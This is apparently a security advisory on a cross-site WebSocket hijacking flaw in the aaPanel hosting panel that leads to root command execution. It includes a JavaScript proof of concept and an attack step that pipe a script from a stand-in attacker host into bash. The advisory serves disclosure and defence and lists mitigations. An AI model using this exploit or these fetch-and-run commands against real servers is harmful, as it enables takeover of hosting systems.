# Security Advisory: aaPanel WebSocket CSWSH-to-RCE
## (Incomplete fix for CVE-2021-37840)

**Vendor:** aaPanel (https://www.aapanel.com)
**Product:** aaPanel Web Hosting Control Panel
**Versions Affected:** 6.8.12 through 8.10.0 (latest at time of discovery)
**CVSS Score:** 8.8 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
**CVE Status:** Not yet assigned
**Discovered:** June 2026

---

## Summary

aaPanel contains a Cross-Site WebSocket Hijacking (CSWSH) vulnerability in its
WebSocket endpoints that allows an attacker to achieve Remote Code Execution
when a logged-in administrator visits a malicious webpage. The fix for
CVE-2021-37840 (CSWSH in aaPanel through 6.8.12) is incomplete — all WebSocket
endpoints still accept connections before verifying authentication, and the
CSRF token check can be bypassed because the CSRF token is never initialized
in the WebSocket request context.

---

## Vulnerability Details

### 1. WebSocket Endpoints Accept Connections Without Auth

All WebSocket endpoints return HTTP 101 Switching Protocols before any
authentication check occurs. The auth check (`comm.local()`) runs at the
application level AFTER the WebSocket upgrade completes:

```python
@sockets.route('/sock_shell')
def sock_shell(ws):
    comReturn = comm.local()        # <-- AUTH CHECK HAPPENS HERE
    if comReturn:                    #     AFTER 101 is already sent
        ws.send(str(comReturn))
        return
```

Affected endpoints:
- `/webssh` (SSH terminal proxy)
- `/sock_shell` (direct command execution)
- `/ws_panel` (panel management)
- `/ws_home` (dashboard)
- `/ws_project` (project management)
- `/ws_model` (model management)
- `/workorder_client` (ticket system)
- `/v2/*` variants of all above

### 2. CSRF Token Check Bypass

The `check_csrf_websocket()` function compares the client-supplied token
against the session token:

```python
def check_csrf_websocket(ws, args):
    if g.is_aes: return True
    if g.api_request: return True
    if public.is_debug(): return True
    is_success = True
    if not 'x-http-token' in args:
        is_success = False
    if is_success:
        if public.get_csrf_sess_html_token_value() != args['x-http-token']:
            is_success = False
    if not is_success:
        ws.send('token error')
        return False
    return True
```

The CSRF token is stored in `session['request_token_head']`. This value is
ONLY initialized during HTTP GET requests to the main panel route
(`/`) — it is NEVER set for WebSocket connections. For any WebSocket
connection, `session.get('request_token_head')` returns an empty string.

By sending `{"x-http-token": ""}` as the first WebSocket message, the
attacker bypasses the CSRF check because `"" != ""` evaluates to False.

### 3. Remote Code Execution via /sock_shell

The `/sock_shell` endpoint executes arbitrary operating system commands via
Python's `subprocess.Popen` with `shell=True`:

```python
def sock_recv(cmdstring, ws):
    global sock_pids
    try:
        p = subprocess.Popen(cmdstring + " 2>&1",
                             close_fds=True,
                             shell=True,           # <-- shell=True allows
                             bufsize=4096,         #     arbitrary commands
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
```

Each message received on the WebSocket after authentication is treated as a
shell command and executed directly. Output is streamed back via the
WebSocket connection.

### 4. SSH Proxy via /webssh

The `/webssh` endpoint accepts attacker-supplied SSH connection parameters
from the first WebSocket message:

```python
ssh_info['host'] = get['host'].strip()
ssh_info['port'] = int(get['port'])
ssh_info['username'] = get['username'].strip()
ssh_info['password'] = get['password'].strip()
```

If the target host is `127.0.0.1` or `localhost`, the handler attempts to
use stored SSH credentials from the panel's database, or falls back to
connecting with the attacker-supplied credentials.

---

## Attack Scenario

1. Administrator is logged into aaPanel (has valid session cookie)
2. Administrator visits a malicious webpage (or an ad/iframe on another site)
3. Malicious page opens WebSocket to `wss://victim-panel:8888/sock_shell`
4. Browser automatically includes the session cookie
5. `comm.local()` passes because session contains `login = True`
6. Malicious page sends `{"x-http-token": ""}` — CSRF check bypasses
7. Malicious page sends `curl http://attacker.com/payload | bash` — command
   executes as root on the panel server

---

## Proof of Concept

```javascript
// CSWSH-to-RCE exploit for aaPanel
// Requires: victim logged into aaPanel

var ws = new WebSocket('wss://VICTIM_PANEL:8888/sock_shell');

ws.onopen = function() {
    // Step 1: Bypass CSRF check with empty token
    ws.send(JSON.stringify({"x-http-token": ""}));
    
    // Step 2: Execute arbitrary command (sent as separate message)
    setTimeout(function() {
        ws.send('id; curl http://ATTACKER_SERVER/payload.sh | bash');
    }, 500);
};

ws.onmessage = function(event) {
    console.log('Output:', event.data);
};
```

---

## Mitigation

1. **Check authentication BEFORE accepting WebSocket upgrade:**
   Return HTTP 401 Unauthorized at the handshake level if the user is not
   authenticated, rather than accepting the connection and checking after.

2. **Initialize CSRF token for WebSocket sessions:**
   Ensure `session['request_token_head']` is set before any WebSocket
   handler processes messages.

3. **Validate Origin header on WebSocket upgrade:**
   Reject WebSocket connections from origins that don't match the panel's
   hostname.

4. **Disable sock_shell if not required:**
   The direct command execution endpoint should be restricted or removed.

---

## Timeline

- 2021-07: Original CVE-2021-37840 reported
- 2021: Partial fix added (check_csrf_websocket)
- 2026-06: Discovery that fix is incomplete
- 2026-06-23: Advisory written

---

## References

- CVE-2021-37840: Original aaPanel CSWSH vulnerability
- https://github.com/aaPanel/aaPanel
